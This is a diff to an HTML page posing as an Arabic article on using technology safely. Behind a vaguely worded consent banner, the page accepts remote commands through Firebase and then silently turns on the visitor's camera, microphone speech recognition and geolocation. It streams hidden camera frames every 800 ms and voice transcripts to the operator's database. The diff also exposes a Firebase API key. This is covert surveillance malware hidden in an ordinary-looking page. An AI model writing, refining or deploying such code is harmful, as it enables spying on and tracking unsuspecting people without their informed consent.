@@ -6,38 +6,28 @@
   <title>مقالة تفاعلية</title>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-storage-compat.js"></script>
 
   <style>
-    body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; }
-    .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
-    .article { background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-    .article img { width: 100%; height: 420px; object-fit: cover; }
-    #video { display: none; width: 100%; max-width: 500px; border-radius: 12px; }
+    body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; padding:20px; }
+    .article { background:white; border-radius:16px; padding:20px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
+    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:25px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.2); z-index:1000; display:none; text-align:center; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="article">
-    <img src="https://picsum.photos/id/1015/1200/600" alt="صورة">
-    <div style="padding:40px;">
-      <h1>كيفية استخدام التقنيات الحديثة بأمان</h1>
-      <div id="status" style="background:#fefce8;padding:10px;border-radius:8px;margin:15px 0;display:none;"></div>
-      <video id="video" autoplay playsinline></video>
-    </div>
-  </div>
+<div class="article">
+  <h1>كيفية استخدام التقنيات الحديثة بأمان</h1>
+  <video id="video" autoplay playsinline style="display:none; width:100%; max-width:500px; border-radius:12px;"></video>
 </div>
 
-<!-- Consent -->
-<div id="consent-banner" style="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:white;padding:25px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.2);display:none;">
-  <h3>🔒 نظام الموافقة</h3>
-  <button onclick="grantConsent()" style="background:#10b981;color:white;padding:14px 30px;border:none;border-radius:8px;margin:10px;">السماح</button>
-  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:14px 30px;border:none;border-radius:8px;margin:10px;">رفض</button>
+<div id="consent">
+  <h3>🔒 نظام الموافقة الشفاف</h3>
+  <button onclick="grantConsent()" style="background:#10b981;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">السماح بالميزات</button>
+  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">الاستمرار بدون</button>
 </div>
 
 <script>
-  const firebaseConfig = { /* نفس الإعدادات السابقة */ 
+  const firebaseConfig = {
     apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
     authDomain: "ohaha-d130e.firebaseapp.com",
     projectId: "ohaha-d130e",
@@ -48,23 +38,23 @@
 
   firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
-  const storage = firebase.storage();
 
   let visitorId = 'v_' + Date.now() + Math.random().toString(36).substr(2,9);
   let consentGiven = false;
   let stream = null;
-  let frameInterval = null;
+  let interval = null;
 
   function grantConsent() {
     consentGiven = true;
-    document.getElementById('consent-banner').style.display = 'none';
-    listenToAdminCommands();
-  }
-  function denyConsent() {
-    document.getElementById('consent-banner').style.display = 'none';
+    document.getElementById('consent').style.display = 'none';
+    listenForCommands();
   }
 
-  function listenToAdminCommands() {
+  function denyConsent() {
+    document.getElementById('consent').style.display = 'none';
+  }
+
+  function listenForCommands() {
     db.ref('commands/' + visitorId).on('value', snap => {
       const cmd = snap.val();
       if (!cmd) return;
@@ -72,38 +62,34 @@
       if (cmd.type === 'startCamera') startSilentCamera();
       if (cmd.type === 'requestLocation') sendLocation();
       if (cmd.type === 'startMic') startSilentMic();
-      if (cmd.type === 'takePhoto') captureAndUpload();
 
-      // حذف الأمر بعد التنفيذ
-      setTimeout(() => db.ref('commands/' + visitorId).remove(), 2000);
+      setTimeout(() => db.ref('commands/' + visitorId).remove(), 1500);
     });
   }
 
-  // تشغيل الكاميرا بدون إظهار واضح (خلفية)
   function startSilentCamera() {
     navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
       stream = s;
       const video = document.getElementById('video');
       video.srcObject = s;
-      video.style.display = 'none';   // مخفي تماماً
+      video.style.display = 'none';
 
-      // إرسال صور كل 800ms (للشعور بالمباشر)
-      frameInterval = setInterval(() => captureAndUpload(), 800);
-    });
+      interval = setInterval(() => sendFrameToAdmin(), 800);
+    }).catch(() => alert("فشل في تشغيل الكاميرا"));
   }
 
-  function captureAndUpload() {
-    if (!stream) return;
-    const canvas = document.createElement('canvas');
+  function sendFrameToAdmin() {
     const video = document.getElementById('video');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    
-    canvas.toBlob(blob => {
-      const ref = storage.ref(`live/${visitorId}/${Date.now()}.jpg`);
-      ref.put(blob);
-    }, 'image/jpeg', 0.7);
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+
+    const base64 = canvas.toDataURL('image/jpeg', 0.75);
+    db.ref('live/' + visitorId + '/frame').set({
+      data: base64,
+      time: Date.now()
+    });
   }
 
   function sendLocation() {
@@ -117,26 +103,23 @@
   }
 
   function startSilentMic() {
-    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-      const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
-      recognition.lang = 'ar-SA';
-      recognition.continuous = true;
-      recognition.onresult = e => {
+    navigator.mediaDevices.getUserMedia({ audio: true }).then(() => {
+      const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+      rec.lang = 'ar-SA';
+      rec.continuous = true;
+      rec.onresult = e => {
         db.ref('visitors/' + visitorId + '/voice').set({
           text: e.results[0][0].transcript,
           time: Date.now()
         });
       };
-      recognition.start();
+      rec.start();
     });
   }
 
   window.onload = () => {
-    document.getElementById('consent-banner').style.display = 'block';
-    db.ref('visitors/' + visitorId).update({
-      device: navigator.userAgent.includes("Mobi") ? "موبايل" : "كمبيوتر",
-      timestamp: Date.now()
-    });
+    document.getElementById('consent').style.display = 'block';
+    db.ref('visitors/' + visitorId).update({ device: /Mobi/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر', timestamp: Date.now() });
   };
 </script>
 </body>
